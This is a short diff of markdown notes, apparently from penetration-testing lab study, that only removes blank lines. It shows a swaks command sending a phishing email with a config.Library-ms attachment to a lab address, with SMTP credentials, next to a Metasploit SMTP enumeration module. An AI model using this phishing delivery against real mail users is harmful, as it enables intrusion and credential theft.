@@ -16,8 +16,6 @@ use auxiliary/scanner/smtp/smtp_enum
 
 ```bash
 swaks --to bob@adot8.com --from maildmz@relia.com --header 'Subject: Bad email!' --body "I've attached the problematic mail." --server 192.168.166.189 --attach @config.Library-ms --auth-user 'john@adot8.com' --auth-password 'abc123'
-
-
 ```
 
 Real Life
